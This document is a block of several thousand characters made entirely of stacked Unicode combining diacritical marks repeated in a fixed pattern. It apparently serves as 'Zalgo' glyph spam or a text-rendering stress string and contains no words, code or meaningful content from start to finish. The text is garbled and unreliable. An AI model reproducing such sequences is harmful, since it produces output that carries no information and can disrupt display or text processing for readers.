͛̽͛̐͛̽͛̋͛̽͛̏͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̈́͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̏͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̏͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̏͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̏͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̈́͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̏͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̏͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̏͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛